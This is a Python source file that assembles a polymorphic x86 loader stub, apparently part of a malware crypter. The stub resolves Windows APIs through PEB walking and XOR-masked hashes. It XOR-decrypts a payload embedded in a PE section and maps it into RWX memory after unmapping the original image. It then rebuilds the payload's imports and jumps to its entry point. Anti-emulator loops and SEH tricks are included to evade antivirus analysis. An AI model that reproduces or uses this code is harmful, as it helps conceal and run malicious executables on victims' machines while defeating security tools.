import random
from collections import OrderedDict
from x86 import *
from metaengine import MetaEngine

class Stub:
	def __init__(self):
		self.update_table(0xFFFF0000, 0xFFFFFFFF)
		self.value_big = random.randint(100000000, 0xFFFFFFFF)
		self.value_emulator = random.randint(0x1000, 0xFFFFFFFF)
		self.value_boot = random.randint(0x1000, 0xFFFFFFFF)

	def update_table(self, base_addr, xor_key):
		self.table = ''
		self.var = OrderedDict()
		self.offset = OrderedDict()

		self.var['dwNtdll'] = 0
		self.var['dwKernel32'] = 0
		self.var['dwNumberOfNames'] = 0
		self.var['dwFunctions'] = 0
		self.var['dwNameOrdinals'] = 0
		self.var['dwFile'] = 0
		self.var['dwFileSize'] = 0
		self.var['dwKey'] = 0
		self.var['dwFileImageBase'] = 0
		self.var['dwSectionBaseAddr'] = 0
		self.var['dwViewSize'] = 0
		self.var['dwBoot'] = 0			
		self.var['hProcess'] = 0
		self.var['dwEntryPoint'] = 0
		self.var['dwModule'] = 0
		self.var['dwOriginalFirstThunk'] = 0
		self.var['dwFirstThunk'] = 0
		self.var['dwCurrentDLL'] = 0
		self.var['hSection'] = 0
		self.var['liMaxSize'] = 0  # align8
		keys = self.var.keys()
		#random.shuffle(keys)
		self.var2 = OrderedDict()
		self.var2['dwHashNtCreateSection'] 		= 0xd02e20d0 ^ xor_key
		self.var2['dwHashNtMapViewOfSection'] 	= 0x231f196a ^ xor_key
		self.var2['dwHashNtUnmapViewOfSection'] = 0x595014ad ^ xor_key  
		self.var2['dwHashGetCurrentProcess'] 	= 0xca8d7527 ^ xor_key 
		self.var2['dwHashGetProcAddress'] 		= 0xcf31bb1f ^ xor_key 
		self.var2['dwHashVirtualAlloc'] 		= 0x382c0f97 ^ xor_key
		self.var2['dwHashGetModuleHandleW'] 	= 0x5a153f6e ^ xor_key 
		self.var2['dwHashLoadLibraryA'] 		= 0x5fbff0fb ^ xor_key
		self.var2['dwHashGetLastError'] 		= 0x2082eae3 ^ xor_key 
		self.var2['dwNtCreateSection'] = 0
		self.var2['dwNtMapViewOfSection'] = 0
		self.var2['dwNtUnmapViewOfSection'] = 0
		self.var2['dwGetCurrentProcess'] = 0
		self.var2['dwGetProcAddress'] = 0
		self.var2['dwVirtualAlloc'] = 0
		self.var2['dwGetModuleHandleW'] = 0
		self.var2['dwLoadLibraryA'] = 0
		self.var2['dwGetLastError'] = 0
		self.var.update(self.var2)
		keys += self.var2.keys()

		for var in keys:
			if ('dw' in var[0:2]) or ('h' in var[0]): # DWORD
				self.table += struct.pack('<I', self.var[var])
				self.offset[var] = base_addr
				base_addr += 4
			elif 'sz' in var[0:2]: # char[]
				self.table += self.var[var] + '\x00'
				self.offset[var] = base_addr
				base_addr += len(self.var[var])+1
			elif 'li' in var[0:2]: # QWORD
				while (base_addr % 8) != 0: # align 8
					self.table += '\x00'
					base_addr += 1

				self.table += struct.pack('<Q', self.var[var])
				self.offset[var] = base_addr
				base_addr += 8
			else:
				raise ValueError(var)

	def add_function(self, name, offset):
		self.offset[name] = offset

	def asm_get_ntdll(self, meta_engine):
	    reg1 = meta_engine.random_reg(dword, [eax, ebp, esp])

	    return Block(
	        fs(), mov(reg1, dword[0x30]),      # PEB
	        mov(reg1, dword[reg1 + 0x0C]),   # PEB->Ldr
	        mov(reg1, dword[reg1 + 0x14]),   # PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
	        mov(reg1, dword[reg1]),          # 2nd entry (ntdll.dll)
	        mov(reg1, dword[reg1 + 0x10]),   # ImageBase of the 2nd entry 
	        mov(eax, reg1),      
	        retn()
	    )

	def asm_get_kernel32(self, meta_engine):
	    reg1 = meta_engine.random_reg(dword, [eax, ebp, esp])

	    return Block(
	        fs(), mov(reg1, dword[0x30]),      # PEB
	        mov(reg1, dword[reg1 + 0x0C]),   # PEB->Ldr
	        mov(reg1, dword[reg1 + 0x14]),   # PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
	        mov(reg1, dword[reg1]),          # 2nd entry (ntdll.dll)
	        mov(reg1, dword[reg1]),          # 3rd entry (kernel32.dll)
	        mov(reg1, dword[reg1 + 0x10]),   # ImageBase of the 2nd entry 
	        mov(eax, reg1),      
	        retn()
	    )

	def asm_djbhash(self, meta_engine, xor_key):
		return Block(
		    mov(edx, dword[esp+4]),
		    mov(eax, 5381),         # 2^32
		    Label('hLoop'),
		    mov(ecx, eax),        	
		    shl(eax, 5),			# eax << 5
		    add(eax, ecx),			# eax + old eax
			movzx(ecx, byte[edx]),	
		    add(eax, ecx),			
		    inc(edx),            	
		    cmp_(byte[edx], 0),  
		    jnz(Label('hLoop')),
		    xor(eax, xor_key),
		    retn(4)
		)

	def asm_memcpy(self, meta_engine):
		return Block(
			push(esi), 
			push(edi), 
			push(ecx),
			mov(edi, dword[esp+16]),	# dest
			mov(esi, dword[esp+20]),	# source
			mov(ecx, dword[esp+24]),	# count
			cmp_(ecx, 0),	
			jz(Label('endCopy')),
			Label('copyLoop'),
				mov(al, byte[esi]),
				mov(byte[edi], al),
				inc(edi),
				inc(esi),
				dec(ecx),
				cmp_(ecx, 0),
			jnz(Label('copyLoop')),
			Label('endCopy'),
			pop(ecx),
			pop(edi), 
			pop(esi),
			retn(12)
		)

	def asm_get_function_addr(self, meta_engine):
		return Block(
			mov(eax, dword[esp+4]),				# dll
		    cmp_(word[eax], 0x5A4D),
		    jnz(Label('exit')),                 
		    mov(edx, dword[eax+0x3C]),          # DosHeader.e_lfanew
		    add(eax, edx),                      
		    cmp_(dword[eax], 0x4550),
		    jnz(Label('exit')),              
		    mov(edx, dword[eax+0x78]),          # PeHeader.EAT.VirtualAdress
		    mov(eax, dword[esp+4]),     		# dll
		    add(eax, edx),                      # EAT \o/
		    mov(edx, dword[eax+0x18]),          # EAT.NumberOfNames
			mov(dword[ebp+self.offset['dwNumberOfNames']], edx),
		    mov(edx, dword[eax+0x1C]),          # EAT.AddressOfFunctions
			mov(dword[ebp+self.offset['dwFunctions']], edx),
		    mov(edx, dword[eax+0x24]),          # EAT.AddressOfNameOrdinals
			mov(dword [ebp+self.offset['dwNameOrdinals']], edx),
		    mov(eax, dword[eax+0x20]),          # EAT.AddressOfNames
		    add(eax, dword[esp+4]),     		# VA
			xor(ecx, ecx),
		    Label('NameLoop'),
			    mov(edx, dword[eax]),               # name
				add(edx, dword[esp+4]), 			# VA
				push(ecx),
				push(eax),							# save the values
				push(edx),							# push the name
				lea(eax, dword[ebp+self.offset['DjbHash']]),
				call_abs(eax),						
				mov(edx, eax),
				pop(eax),
				pop(ecx),						
				cmp_(edx, dword[esp+8]),
				jz(Label('LoadApi')),
				add(eax, 4),                      	# next name
				inc(ecx),
				cmp_(ecx, dword[ebp+self.offset['dwNumberOfNames']]), 	# we have seen all functions?
			    jnz(Label('NameLoop')),
			Label('LoadApi'),
			mov(eax, dword[ebp+self.offset['dwNameOrdinals']]),		# EAT.AddressOfNameOrdinals
			add(eax, dword[esp+4]),				# VA
			xor(edx, edx),
			mov(dx, word[eax+ecx*2]),			# his ordinal
			mov(eax, dword[ebp+self.offset['dwFunctions']]),	# EAT.AddressOfFunctions
			add(eax, dword[esp+4]),				# VA
			mov(eax, dword[eax+edx*4]),			# function RVA
			add(eax, dword[esp+4]),				# VA -> WIN \o/
			Label('exit'),
			retn(8)
		)

	def asm_loop_api(self, meta_engine):
		return Block(
		    lea(eax, dword[ebp+self.offset['GetKernel32']]),
		    call_abs(eax),
		    mov(dword[ebp+self.offset['dwKernel32']], eax), # Kernel32 address
			lea(eax, dword[ebp+self.offset['GetNtdll']]),
		    call_abs(eax),
			mov(dword[ebp+self.offset['dwNtdll']], eax), # NTDLL address
			mov(ecx, 3), 							# load ntdll api
			lea(esi, dword[ebp+self.offset['dwHashNtCreateSection']]),
			lea(edi, dword[ebp+self.offset['dwNtCreateSection']]),
			Label('loopApiNtdll'),
				push(ecx), 							# save it
				push(edi),
				push(esi),
				push(dword[esi]),
				push(dword[ebp+self.offset['dwNtdll']]),
				lea(eax, dword[ebp+self.offset['GetFunctionAddr']]),
				call_abs(eax),
				pop(esi),
				pop(edi),
				pop(ecx),
				mov(dword[edi], eax),
				add(esi, 4),
				add(edi, 4),
				dec(ecx),
				cmp_(ecx, 0),
			jnz(Label('loopApiNtdll')),
			mov(ecx, 6),							# load kernel32 api
			lea(esi, dword[ebp+self.offset['dwHashGetCurrentProcess']]),
			lea(edi, dword[ebp+self.offset['dwGetCurrentProcess']]),
			Label('loopApiKernel'),
				push(ecx), 							# save it
				push(edi),
				push(esi),
				push(dword[esi]),
				push(dword[ebp+self.offset['dwKernel32']]),
				lea(eax, dword[ebp+self.offset['GetFunctionAddr']]),
				call_abs(eax),
				pop(esi),
				pop(edi),
				pop(ecx),
				mov(dword[edi], eax),
				add(esi, 4),
				add(edi, 4),
				dec(ecx),
				cmp_(ecx, 0),
			jnz(Label('loopApiKernel')),
			ret()
		)

	def asm_load_file(self, meta_engine, section_nb):
		return Block(
			push(0), # get our file
			call_abs(dword[ebp+self.offset['dwGetModuleHandleW']]),
			mov(dword[ebp+self.offset['dwModule']], eax),
			mov(esi, eax),										# dwModule
			mov(esi, dword[esi + 0x3C]), 						# e_lfanew
			add(esi, dword[ebp+self.offset['dwModule']]),		# NT HEADERS
			lea(eax, dword[0xF8 + (section_nb-1)*0x28]),		# section n (sizeof NtHeaders = 0xF8)
			add(esi, eax),										# sections table
			mov(eax, dword[esi + 0x0C]), 						# VirtualAddress
			add(eax, dword[ebp+self.offset['dwModule']]),
			mov(dword[ebp+self.offset['dwFile']], eax),			# VA of file section
			mov(eax, dword[esi + 0x8]), 						# VirtualSize
			mov(dword[ebp+self.offset['dwFileSize']], eax),		# encrypted file size
				
			#----- Section 3 ------
			#----| Key | File |---
			#------------------------
			mov(eax, dword[ebp+self.offset['dwFile']]),
			mov(eax, dword[eax]), 			# key
			mov(dword[ebp+self.offset['dwKey']], eax),
			add(dword[ebp+self.offset['dwFile']], 4),		# file after the key
			mov(eax, dword[ebp+self.offset['dwKey']]),		# XOR DWORD incoming
			mov(ecx, dword[ebp+self.offset['dwFile']]),
			mov(edi, ecx),
			add(edi, dword[esi + 0x8]), # end of file
			Label('decrypt'),
				xor(dword[ecx], eax),
				add(ecx, 4),				
				cmp_(ecx, edi),				# EOF
			jl(Label('decrypt')),
			ret()
		)

	def asm_relocate_loader(self, meta_engine):
		return Block(
			lea(eax, dword[ebp+self.offset['liMaxSize']]),
			mov(dword[eax + 4], 0),  						# dwHighPart
			mov(eax, dword[esp+4]),							# program size						
			add(eax, dword[ebp+self.offset['dwFileSize']]),	# file size
			mov(dword[ebp+self.offset['liMaxSize']], eax), 	# max page size (dwLowPart)
			lea(esi, dword[ebp+self.offset['liMaxSize']]),
			lea(eax, dword[ebp+self.offset['hSection']]),
			push(0),
			push(0x8000000),                    # SEC_COMMIT
			push(0x40),                         # PAGE_EXECUTE_READWRITE
			push(esi),							# maxSize
			push(0),
			push(0xF001F),                      # SECTION_ALL_ACCESS
			push(eax),							# hSection
			call_abs(dword[ebp+self.offset['dwNtCreateSection']]),	# section
			lea(edi, dword[ebp+self.offset['dwSectionBaseAddr']]),
			mov(dword[ebp+self.offset['dwViewSize']], 0),		
			lea(esi, dword[ebp+self.offset['dwViewSize']]),
			call_abs(dword[ebp+self.offset['dwGetCurrentProcess']]),	
			push(0x40),                         # PAGE_EXECUTE_READWRITE
			push(0),
			push(1),							# ViewShare
			push(esi),							# dwViewSize
			push(0),
			push(0),
			push(0),
			push(edi),							# dwSectionBaseAddr
			push(eax),							# GetCurrentProcess()
			push(dword[ebp+self.offset['hSection']]),
			call_abs(dword[ebp+self.offset['dwNtMapViewOfSection']]), 	# we map
			mov(eax, dword[esp+4]),					# program size							
			mov(edi, dword[ebp+self.offset['dwSectionBaseAddr']]),
			add(edi, eax),							# after the loader
			mov(esi, dword[ebp+self.offset['dwFile']]),			
			mov(dword[ebp+self.offset['dwFile']], edi),				
			push(eax),								# Size
			push(ebp),								# shellcode
			push(dword[ebp+self.offset['dwSectionBaseAddr']]),			# Destination
			lea(eax, dword[ebp+self.offset['MemCpy']]),
			call_abs(eax),								# memcpy() - shellcode
			push(dword[ebp+self.offset['dwFileSize']]),					# Size
			push(esi),								# Source - old dwFile
			push(edi),								# Destination	
			lea(eax, dword[ebp+self.offset['MemCpy']]),
			call_abs(eax),								# memcpy()
			mov(dword[ebp+self.offset['dwFile']], edi),	
			mov(eax, dword[ebp+self.offset['dwSectionBaseAddr']]),
			mov(edi, eax),
			add(edi, dword[esp+8]),
			mov(dword[edi + 1], eax),				# update the delta offset
			retn(0x8)
		)

	def asm_map_file(self, meta_engine):
		return Block(
            call_abs(dword[ebp+self.offset['dwGetCurrentProcess']]),	
	        mov(dword[ebp+self.offset['hProcess']], eax),
            push(0x400000),						    # BaseAddress
            push(dword[ebp+self.offset['hProcess']]),					# ProcessHandle
            call_abs(dword[ebp+self.offset['dwNtUnmapViewOfSection']]), 		# Unmap the base process
            mov(esi, dword[ebp+self.offset['dwFile']]),		    	# DOS Header
            add(esi, dword[esi + 0x3C]), 							# NT Headers
            mov(eax, dword[esi + 0x28]),							# AddressOfEntryPoint
            mov(dword[ebp+self.offset['dwEntryPoint']], eax),
            push(0x40),												# PAGE_EXECUTE_READWRITE
            push(0x3000),											# MEM_COMMIT or MEM_RESERVE
            push(dword[esi + 0x50]),								# SizeOfImage
            push(dword[esi + 0x34]),								# ImageBase
            call_abs(dword[ebp+self.offset['dwVirtualAlloc']]),
            mov(dword[ebp+self.offset['dwFileImageBase']], eax),
            call_abs(dword[ebp+self.offset['dwGetLastError']]),
            push(dword[esi + 0x54]), 								# SizeOfHeaders
            push(dword[ebp+self.offset['dwFile']]),				    # Source
            push(dword[ebp+self.offset['dwFileImageBase']]),		# Destination
            lea(eax, dword[ebp+self.offset['MemCpy']]),
            call_abs(eax),
            xor(ecx, ecx),
            mov(cx, word[esi + 0x06]),								# NumberOfSections
            add(esi, 0xF8),			                				# section table
            Label('loopSections'),
                mov(eax, dword[esi + 0x14]),  							# PointerToRawData, section RVA
                add(eax, dword[ebp+self.offset['dwFile']]),				# VA
                mov(edi, dword[esi + 0xC]), 							# VirtualAddress, destination
                add(edi, dword[ebp+self.offset['dwFileImageBase']]),	# VA
                push(dword[esi + 0x10]),						# SizeOfRawData
                push(eax),									# Source
                push(edi),									# Destination
                lea(eax, dword[ebp+self.offset['MemCpy']]),	
                call_abs(eax),								# memcpy()
                add(esi, 0x28), 	    					# next section
                dec(ecx),
                cmp_(ecx, 0),
            jnz(Label('loopSections')),
            ret()
		)

	def asm_load_iat(self, meta_engine):
		return Block(
            fs(), mov(eax, dword[0x30]),       		    # PEB
            mov(esi, dword[ebp+self.offset['dwFileImageBase']]),
            mov(dword[eax+8], esi),				    # ImageBase (look PEB struct)
            # load IAT! 
            mov(esi, dword[ebp+self.offset['dwFileImageBase']]),
            add(esi, dword[esi + 0x3C]),	            			# NT Headers
            mov(esi, dword[esi + 0x80]),    						# RVA IAT
            cmp_(esi, 0), 											# No IAT?
            jz(Label('noIAT')),
            add(esi, dword[ebp+self.offset['dwFileImageBase']]),	# VA
            Label('nextDll'),
                mov(eax, dword[esi + 0xC]),				# Name1
                add(eax, dword[ebp+self.offset['dwFileImageBase']]),	# DLL name
                push(eax),
                call_abs(dword[ebp+self.offset['dwLoadLibraryA']]),			# DLL address
                mov(dword[ebp+self.offset['dwCurrentDLL']], eax),					
                mov(eax, dword[esi]),							# OriginalFirstThunk
                cmp_(eax, 0), 									
                jnz(Label('noBorland')),
                mov(eax, dword[esi + 0x10]),					# We use FirstThunk (fucking Borland)
                Label('noBorland'),
                add(eax, dword[ebp+self.offset['dwFileImageBase']]),
                mov(dword[ebp+self.offset['dwOriginalFirstThunk']], eax),      	# VA of OriginalFirstThunk	
                mov(eax, dword[esi + 0x10]),									# FirstThunk
                add(eax, dword[ebp+self.offset['dwFileImageBase']]),
                mov(dword[ebp+self.offset['dwFirstThunk']], eax),		        # VA of FirstThunk
                Label('nextAPI'),
                    mov(eax, dword[ebp+self.offset['dwOriginalFirstThunk']]),			# IMAGE_THUNK_DATA32 (VA)
                    mov(eax, dword[eax]), 								# AddressOfData, IMAGE_IMPORT_BY_NAME (RVA)
                    test(eax, 0x80000000),				    			# IMAGE_ORDINAL_FLAG32, export by ordinal?
                    jz(Label('importByName')),
                    Label('importByOrdinal'),
                    and_(eax, 0x0FFFF),                                 # we keep the LSB
                    jmp(Label('searchAPI')),
                    Label('importByName'),
                    add(eax, dword[ebp+self.offset['dwFileImageBase']]), # VA
                    Label('searchAPI'),
                    lea(edi, dword[eax + 0x2]),							# Name1 
                    push(edi),					                        # API name
                    push(dword[ebp+self.offset['dwCurrentDLL']]),       # DLL
                    call_abs(dword[ebp+self.offset['dwGetProcAddress']]),	# this address 
                    push(edi),
                    mov(edi, dword[ebp+self.offset['dwFirstThunk']]),
                    mov(dword[edi], eax),			    # update the FirstThunk with the function address
                    pop(edi),
                    add(dword[ebp+self.offset['dwOriginalFirstThunk']], 4), # next dwOriginalFirstThunk
                    add(dword[ebp+self.offset['dwFirstThunk']], 4), 		# next FirstThunk
                    mov(eax, dword[ebp+self.offset['dwOriginalFirstThunk']]), 	# VA of OFT
                    mov(eax, dword[eax]),									# AddressOfData				
                cmp_(eax, 0),												# latest API?
                jnz(Label('nextAPI')),	
                add(esi, 0x14), 				# next DLL
            cmp_(dword[esi + 0x10], 0),			# FirstThunk
            jnz(Label('nextDll')),
            Label('noIAT'),
            ret()
		)

	def asm_seh_function(self, meta_engine):
		return Block(
			# clear SEH
			mov(esp, dword[esp+8]),
	       	pop(eax),				
	    	fs(), mov(dword[0], eax),
	    	add(esp, 4), 

	    	mov(eax, self.value_emulator),
			ret()
		)

	def asm_anti_emulator(self, meta_engine):
	    return Block(
	    	fs(), mov(eax, dword[0x30]), 
	    	xor(ecx, ecx),
	    	add(cl, byte[eax+2]),

	    	mov(ecx, 1), 
	     	Label('loop'),
	        	mov(eax, self.value_big),
	        	inc(ecx),
	        	cmp_(ecx, 40000000),
	        	jge(Label('end')),
	        	inc(ecx),
	        	inc(edx),
	        	jmp(Label('loop')),
	        call_abs(edx),			# gtfo emulator!
	        Label('end'),

	        sub(ecx, 40000000),	# ecx = 0
			lea(eax, dword[ebp+self.offset['SehFunction']]),
			add(eax, ecx),
			push(eax), 
			fs(), push(dword[0]),       
			fs(), mov(dword[0], esp),   
			xor(ecx, ecx),
			mov(dword[ecx], eax),	# will call the seh
			call_abs(ecx),			# gtfo emulator!
			ret(),
	    )		

	def asm_program(self, meta_engine, base_address, program_size, entry_point):
	    return Block(
	        mov(ebp, 0x00400000+base_address),				# delta offset
			mov(dword[ebp+self.offset['dwBoot']], esi),		# (look NtCreateSection)
			push(ebp),
			lea(eax, dword[ebp+self.offset['AntiEmulator']]),
			call_abs(eax),
			pop(ebp),
			sub(eax, self.value_emulator),					# eax = 0 without emulator
			add(ebp, eax),
			lea(eax, dword[ebp+self.offset['LoopApi']]),	
			call_abs(eax),									# Load all apis
			cmp_(dword[ebp+self.offset['dwBoot']], self.value_boot),
			jz(Label('mapped')),
			
			lea(eax, dword[ebp+self.offset['LoadFile']]),	
			call_abs(eax),									# Load and decrypt the file
			lea(eax, dword[ebp+self.offset['RelocateLoader']]),	
			push(entry_point-base_address),
			push(program_size),
			call_abs(eax),									# Relocate the loader
			fs(), mov(eax, dword[0x30]),       			# PEB
			mov(esi, dword[ebp+self.offset['dwSectionBaseAddr']]),
			mov(dword[eax+8], esi),							# ImageBase (look PEB struct)
			mov(eax, dword[ebp+self.offset['dwSectionBaseAddr']]),
			add(eax, entry_point-base_address),				# .code section
			mov(esi, self.value_boot),						# BOOT! :D
			jmp_abs(eax),

			Label('mapped'),
			lea(eax, dword[ebp+self.offset['MapFile']]),	
			call_abs(eax),								# Map the file
			lea(eax, dword[ebp+self.offset['LoadIAT']]),	
			call_abs(eax),								# We load the IAT
            mov(eax, dword[ebp+self.offset['dwFileImageBase']]),
            add(eax, dword[ebp+self.offset['dwEntryPoint']]),
            jmp_abs(eax),
		    Label('exit'),
		    ret(),
	    )
